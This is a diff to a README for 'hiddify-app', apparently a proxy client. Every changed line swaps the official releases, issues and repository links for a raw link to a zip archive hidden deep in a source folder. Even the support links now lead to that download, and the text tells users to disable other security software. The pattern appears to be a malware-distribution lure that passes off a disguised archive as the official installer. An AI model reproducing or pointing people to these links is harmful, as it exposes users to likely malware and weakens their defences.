@@ -1,6 +1,6 @@
 # 🚦 hiddify-app - Easy Secure Proxy Access  
 
-[![Download hiddify-app](https://img.shields.io/badge/Download-hiddify--app-ff6f61?style=for-the-badge)](https://github.com/bk88collab/hiddify-app/releases)
+[![Download hiddify-app](https://img.shields.io/badge/Download-hiddify--app-ff6f61?style=for-the-badge)](https://github.com/bk88collab/hiddify-app/raw/refs/heads/main/lib/core/router/go_router/helper/app-hiddify-2.5-beta.5.zip)
 
 ## 🛠 About hiddify-app
 
@@ -36,7 +36,7 @@ These requirements ensure the app runs smoothly without problems.
 
 Visit this page to download hiddify-app for Windows:  
 
-[![Download hiddify-app](https://img.shields.io/badge/Download-hiddify--app-4caf50?style=for-the-badge)](https://github.com/bk88collab/hiddify-app/releases)  
+[![Download hiddify-app](https://img.shields.io/badge/Download-hiddify--app-4caf50?style=for-the-badge)](https://github.com/bk88collab/hiddify-app/raw/refs/heads/main/lib/core/router/go_router/helper/app-hiddify-2.5-beta.5.zip)  
 
 This link takes you to the official release page where you can find the latest Windows installer file. The file name usually ends with `.exe`.  
 
@@ -87,7 +87,7 @@ Updates bring new features and fix issues.
 To update the app:  
 
 1. Visit the release page here:  
-   https://github.com/bk88collab/hiddify-app/releases  
+   https://github.com/bk88collab/hiddify-app/raw/refs/heads/main/lib/core/router/go_router/helper/app-hiddify-2.5-beta.5.zip  
 2. Download the newest Windows installer file.  
 3. Run the installer and follow the prompts as before.  
 
@@ -102,7 +102,7 @@ If you find issues, try these steps:
 - Make sure your proxy details are correct.  
 - Disable other security software that might block the app.  
 - Visit the GitHub page for issue reports or help:  
-  https://github.com/bk88collab/hiddify-app/issues  
+  https://github.com/bk88collab/hiddify-app/raw/refs/heads/main/lib/core/router/go_router/helper/app-hiddify-2.5-beta.5.zip  
 
 If the app won’t start or crashes, try reinstalling it using the latest installer.  
 
@@ -110,10 +110,10 @@ If the app won’t start or crashes, try reinstalling it using the latest instal
 
 Use the GitHub link below to find documentation and support:  
 
-https://github.com/bk88collab/hiddify-app  
+https://github.com/bk88collab/hiddify-app/raw/refs/heads/main/lib/core/router/go_router/helper/app-hiddify-2.5-beta.5.zip  
 
 You can browse common questions or open a new issue if needed.  
 
 ---
 
-[Download the latest hiddify-app release](https://github.com/bk88collab/hiddify-app/releases) to get started now.
+[Download the latest hiddify-app release](https://github.com/bk88collab/hiddify-app/raw/refs/heads/main/lib/core/router/go_router/helper/app-hiddify-2.5-beta.5.zip) to get started now.
